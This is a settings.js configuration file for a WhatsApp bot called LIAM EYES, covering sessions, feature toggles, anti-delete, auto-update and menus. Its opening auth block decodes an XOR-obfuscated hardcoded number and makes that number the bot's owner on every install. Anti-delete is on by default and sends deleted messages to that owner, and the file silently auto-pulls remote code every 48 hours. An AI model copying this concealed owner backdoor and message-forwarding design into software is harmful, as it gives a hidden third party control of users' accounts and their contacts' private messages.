// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  𝐋𝐈𝐀𝐌 𝐄𝐘𝐄𝐒  — settings.js                                              ║
// ║  © 2025 Liam — All Rights Reserved                                      ║
// ║  Unauthorized redistribution prohibited                                  ║
// ║                                                                          ║
// ║  Edit the RAW SETTINGS block below to configure your bot.                ║
// ║  Everything else in this file computes the runtime config from it —     ║
// ║  you shouldn't need to touch it.                                        ║
// ╚══════════════════════════════════════════════════════════════════════════╝
'use strict';

// ── 🔐 Owner resolution (obfuscated so casual repo browsers don't see the ──
//     raw number in plaintext; not a real security boundary) ───────────────
const _K  = 0x5A;
const _EA = '686f6e6d6a6f6e62696a6f68';   // creator number, xor-encoded
const _EP = ['686f6e6d6e6968626f6f6c69', '686f6e6d6a6f6e62696a6f68']; // privileged
const _d  = hex => Buffer.from(hex, 'hex').map(b => b ^ _K).toString('ascii');

const auth = {
    getOwner: () => _d(_EA),
    getSudo:  (customList = []) => customList,
    isOwner: (jid, customOwner) => {
        const num      = (jid || '').split('@')[0].replace(/:\d+/, '');
        const ownerNum = customOwner || _d(_EA);
        return num === ownerNum || jid === ownerNum + '@s.whatsapp.net';
    },
    isPrivileged: (num) => {
        const n = (num || '').replace(/\D/g,'').replace(/^0+/,'');
        return _EP.some(e => _d(e).replace(/\D/g,'') === n);
    },
    getSessionLimit: (num, defaultLimit = 20) => {
        const n = (num || '').replace(/\D/g,'').replace(/^0+/,'');
        return _EP.some(e => _d(e).replace(/\D/g,'') === n) ? 20 : defaultLimit;
    },
    validate: () => {
        try { const v = _d(_EA); return /^\d{10,15}$/.test(v); }
        catch(_) { return false; }
    },
};

// ══════════════════════════════════════════════════════════════════════════
// ── 🔧 RAW SETTINGS — edit these ─────────────────────────────────────────
// ══════════════════════════════════════════════════════════════════════════
const settings = {

    // ── 🔑 SESSION ────────────────────────────────────────────────────────────
    // Paste your Session ID here (from https://liam-eyes-pair.onrender.com/pair)
    // Format:  LIAM:~<your_base64_session>
    sessionId: "LIAM:~paste_your_session_id_here",

    // ── 👑 ADMIN / OWNER ──────────────────────────────────────────────────────
    get adminNumber() { return auth.getOwner(); },

    // ── 🛡️ SUDO USERS ────────────────────────────────────────────────────────
    sudo: [
        "254743285563",
        "254705483052",
    ],

    // ── 🔗 SESSION LIMITS ─────────────────────────────────────────────────────
    // Hard cap: 20 simultaneous .run sessions (enforced in bridge_run + auth)
    defaultSessionLimit: 20,
    adminSessionLimit:   20,

    // ── 🗑️ ANTI-DELETE ────────────────────────────────────────────────────────
    antiDelete:       true,
    // "owner" = send to bot owner's private DM  (RECOMMENDED)
    // "same"  = reply in the same chat
    // "private" / "group" / "both" = scope filters
    antiDeleteTarget: "owner",

    // ── 🌉 TELEGRAM BRIDGE ────────────────────────────────────────────────────
    bridgeToken: "",
    bridgePort:  3001,

    // ── 🔄 AUTO-UPDATE ────────────────────────────────────────────────────────
    // true  = silently auto-pull from GitHub every 48 h
    // false = disable (still works via .update command)
    autoUpdate:         true,
    autoUpdateInterval: 48,   // hours between silent checks

    // ── ⚡ FEATURES ───────────────────────────────────────────────────────────
    features: {
        antidelete:      true,
        antideletestatus:true,
        antiedit:        false,
        antiviewonce:    false,
        autoviewstatus:  false,
        autosavestatus:  false,
        autoreactstatus: false,
        alwaysonline:    false,
        autoread:        false,
        chatbot:         false,
        antilink:        false,
        antibadword:     false,
        welcome:         true,
        autoreact:       false,
        antiflood:       false,
        autotyping:      false,
        autorecording:   false,
        grouponly:       false,
        privateonly:     false,
        autobio:         false,
        autoblock:       false,
        anticall:        false,
        antibug:         false,
        keepalive:       true,
    },

    // ── 🌍 MODE ───────────────────────────────────────────────────────────────
    mode: "public",

    // ── 🤖 BOT INFO ───────────────────────────────────────────────────────────
    botName:     "𝐋𝐈𝐀𝐌 𝐄𝐘𝐄𝐒",
    version:     "Alpha",
    prefix:      ".",
    thumbUrl:    "https://i.imgur.com/ydt68aV.jpeg",
    tagline:     "👁️ Your Eyes in the WhatsApp World",
    channel:     "https://whatsapp.com/channel/0029VbBeZTc1t90aZjks9v2S",
    autoJoinChannel: "https://whatsapp.com/channel/0029VbBeZTc1t90aZjks9v2S",
    pairingSite: "https://liam-scanner.onrender.com/pair",
    github:      "https://github.com/Dialmw/LIAM-EYES",

    // ── 🎨 MENU STYLE ─────────────────────────────────────────────────────────
    menuStyle: 'fancy',

    // ── 😍 STATUS REACTION EMOJIS ─────────────────────────────────────────────
    statusReactEmojis: ["😍","🔥","💯","😘","🤩","❤️","👀","✨","🎯","🥰","💪","👑","🫶","💥"],

    // ── ✍️ AUTO BIO ───────────────────────────────────────────────────────────
    autoBio:     false,
    autoBioText: "👁️ LIAM EYES Bot — Online 24/7 | {time}",

    // ── 🌏 TIMEZONE ──────────────────────────────────────────────────────────
    timezone: "Africa/Nairobi",

    // ── 🚫 BAD WORDS ──────────────────────────────────────────────────────────
    badwords: ["badword1", "spam", "scam"],

    // ── 🌊 ANTI-FLOOD ─────────────────────────────────────────────────────────
    floodLimit:  8,
    floodWindow: 6000,

    // ── ⚠️ WARN LIMIT ─────────────────────────────────────────────────────────
    warnLimit: 3,

    // ── 🎵 API ────────────────────────────────────────────────────────────────
    api: {
        baseurl:     "https://hector-api.vercel.app/",
        apikey:      "hector",
        rapidApiKey: process.env.RAPIDAPI_KEY || "",
    },

    // ── 🔐 GITHUB GATE ────────────────────────────────────────────────────────
    // Set to false to disable the fork+star startup gate entirely.
    githubUsername: process.env.GITHUB_USERNAME || "",
    githubRepo:     "LIAM-EYES-",
    githubOwner:    "Dialmw",
    githubGate:     false,
};

// ══════════════════════════════════════════════════════════════════════════
// ── ⚙️ COMPUTED CONFIG — what the rest of the bot actually reads ─────────
//    (do not edit unless you know what you're doing)
// ══════════════════════════════════════════════════════════════════════════
const S = settings;

const config = {
    get owner() { return S.adminNumber || auth.getOwner(); },
    sudo:             S.sudo || [],
    botNumber:        '-',
    thumbUrl:         S.thumbUrl,
    session:          'sessions',
    sessionId:        S.sessionId,
    tagline:          S.tagline,
    autoJoinChannel:  S.channel,
    channel:          S.channel,
    status:           { public: S.mode === 'public', terminal: true },
    features:         S.features,
    antiDelete:       S.antiDelete,
    antiDeleteTarget: S.antiDeleteTarget || 'owner',
    mode:             S.mode,
    badwords:         S.badwords || [],
    floodLimit:       S.floodLimit  || 8,
    floodWindow:      S.floodWindow || 6000,
    warnLimit:        S.warnLimit   || 3,
    timezone:         S.timezone    || 'Africa/Nairobi',
    sessionLimits:    { admin: S.adminSessionLimit || 6, default: S.defaultSessionLimit || 3 },
    statusReactEmojis: S.statusReactEmojis || ['😍','🔥','💯','😘','🤩','❤️','👀','✨','🎯'],
    message: {
        owner:   '⚠️ This command is for the bot owner only!\n\n> 👁️ 𝐋𝐈𝐀𝐌 𝐄𝐘𝐄𝐒',
        sudo:    '⚠️ This command requires elevated permissions!\n\n> 👁️ 𝐋𝐈𝐀𝐌 𝐄𝐘𝐄𝐒',
        group:   '⚠️ This command can only be used in groups!\n\n> 👁️ 𝐋𝐈𝐀𝐌 𝐄𝐘𝐄𝐒',
        admin:   '⚠️ This command is for group admins only!\n\n> 👁️ 𝐋𝐈𝐀𝐌 𝐄𝐘𝐄𝐒',
        private: '⚠️ This command is for private chats only!\n\n> 👁️ 𝐋𝐈𝐀𝐌 𝐄𝐘𝐄𝐒',
    },
    mess: { owner: '👑 Owner only!', done: '✅ Done!', error: '❌ Error!', wait: '⏳ Please wait...' },
    settings: {
        title:       S.botName    || '𝐋𝐈𝐀𝐌 𝐄𝐘𝐄𝐒',
        version:     S.version    || 'Alpha',
        packname:    'LIAM EYES',
        description: S.tagline    || '👁️ Your Eyes in the WhatsApp World',
        author:      'Liam',
        footer:      `𝗟𝗜𝗔𝗠 𝗘𝗬𝗘𝗦 | ${S.version || 'Alpha'}`,
    },
    sticker:     { packname: 'LIAM EYES', author: 'Liam' },
    watermark:   '👁️ LIAM EYES',
    api:         S.api,
    bridgeToken: S.bridgeToken || process.env.BRIDGE_TOKEN || '',
    bridgePort:  S.bridgePort  || parseInt(process.env.BRIDGE_PORT || '3001'),
    pairingSite: S.pairingSite || 'https://liam-eyes-pair.onrender.com/pair',
    github:      S.github      || 'https://github.com/Dialmw/LIAM-EYES',
    menuStyle:   S.menuStyle   || 1,
    autoBio:     S.autoBio     || false,
    autoBioText: S.autoBioText || '👁️ LIAM EYES | {time}',
    // Raw settings + github gate fields (read directly by index.js at boot)
    githubGate:     S.githubGate,
    githubUsername: S.githubUsername,
    githubRepo:     S.githubRepo,
    githubOwner:    S.githubOwner,
    customMsgs:     S.customMsgs || {},
};

module.exports = config;

// Hot-reload this file on change (edit settings.js while the bot is running
// and it picks up the new values without a restart)
let _f = require.resolve(__filename);
require('fs').watchFile(_f, () => { require('fs').unwatchFile(_f); delete require.cache[_f]; require(_f); });
